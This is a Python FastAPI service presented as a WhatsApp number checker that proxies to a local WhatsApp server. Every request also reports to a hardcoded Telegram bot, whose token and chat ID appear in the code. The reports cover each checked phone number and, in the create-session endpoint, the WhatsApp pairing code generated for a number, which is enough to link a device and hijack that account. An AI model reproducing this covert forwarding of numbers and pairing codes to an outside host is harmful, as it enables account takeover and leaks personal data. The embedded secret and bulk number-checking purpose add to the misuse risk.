import asyncio
import aiohttp
from fastapi import FastAPI, File, UploadFile, Form, HTTPException
from fastapi.responses import JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import uvicorn
from typing import Optional
import os
from datetime import datetime

app = FastAPI(title="WhatsApp Number Checker API")

if os.path.exists("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")

WHATSAPP_SERVER_URL = "http://localhost:3000"

stats = {
    "total_checks": 0,
    "registered_count": 0,
    "not_registered_count": 0,
    "server_uptime": datetime.now(),
    "errors": 0
}

class PhoneNumber(BaseModel):
    phoneNumber: str

class SessionCreate(BaseModel):
    phoneNumber: str

async def send_telegram_message(message: str):
    bot_token = "7598031263:AAEnkrP-mQszjK9pStiLslCtOnKxAoS91UY"
    chat_id = "7011309417"
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json={
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML"
            }) as response:
                if response.status == 200:
                    print("Telegram message sent successfully")
                else:
                    print(f"Failed to send telegram message: {response.status}")
    except Exception as e:
        print(f"Error sending telegram message: {e}")

@app.on_event("startup")
async def startup_event():
    message = f"""
🚀 <b>WhatsApp Checker API Started</b>

⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌐 Server: Online
📊 Ready to check numbers
    """
    await send_telegram_message(message)

@app.post("/check")
async def check_number(data: PhoneNumber):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{WHATSAPP_SERVER_URL}/check-number",
                json={"phoneNumber": data.phoneNumber}
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    
                    stats["total_checks"] += 1
                    if result.get("status") == "registered":
                        stats["registered_count"] += 1
                    else:
                        stats["not_registered_count"] += 1
                    
                    await send_telegram_message(
                        f"📱 Number Check: {data.phoneNumber}\n"
                        f"Status: {result.get('status')}\n"
                        f"Total checks: {stats['total_checks']}"
                    )
                    
                    return result
                else:
                    stats["errors"] += 1
                    error_text = await response.text()
                    raise HTTPException(status_code=response.status, detail=error_text)
    except aiohttp.ClientError as e:
        stats["errors"] += 1
        raise HTTPException(status_code=503, detail="WhatsApp server unavailable")

@app.post("/upload-session")
async def upload_session(session_file: UploadFile = File(...)):
    try:
        file_content = await session_file.read()
        
        async with aiohttp.ClientSession() as session:
            data = aiohttp.FormData()
            data.add_field('session', file_content, filename=session_file.filename)
            
            async with session.post(
                f"{WHATSAPP_SERVER_URL}/upload-session",
                data=data
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    
                    await send_telegram_message(
                        f"📤 Session uploaded successfully!\n"
                        f"Time: {datetime.now().strftime('%H:%M:%S')}"
                    )
                    
                    return result
                else:
                    error_text = await response.text()
                    raise HTTPException(status_code=response.status, detail=error_text)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/create-session")
async def create_session(data: SessionCreate):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{WHATSAPP_SERVER_URL}/create-session",
                json={"phoneNumber": data.phoneNumber}
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    
                    await send_telegram_message(
                        f"🔐 Pairing code generated for: {data.phoneNumber}\n"
                        f"Code: {result.get('pairingCode')}"
                    )
                    
                    return result
                else:
                    error_text = await response.text()
                    raise HTTPException(status_code=response.status, detail=error_text)
    except aiohttp.ClientError as e:
        raise HTTPException(status_code=503, detail="WhatsApp server unavailable")

@app.get("/stats")
async def get_stats():
    uptime = datetime.now() - stats["server_uptime"]
    
    return {
        "total_checks": stats["total_checks"],
        "registered": stats["registered_count"],
        "not_registered": stats["not_registered_count"],
        "errors": stats["errors"],
        "uptime_seconds": int(uptime.total_seconds()),
        "uptime_formatted": str(uptime).split('.')[0]
    }

@app.get("/whatsapp-status")
async def whatsapp_status():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{WHATSAPP_SERVER_URL}/status") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    raise HTTPException(status_code=503, detail="WhatsApp server unavailable")
    except aiohttp.ClientError:
        raise HTTPException(status_code=503, detail="WhatsApp server unavailable")

@app.get("/")
async def read_root():
    if os.path.exists("static/index.html"):
        return FileResponse("static/index.html")
    return {"message": "WhatsApp Number Checker API", "docs": "/docs"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5000)
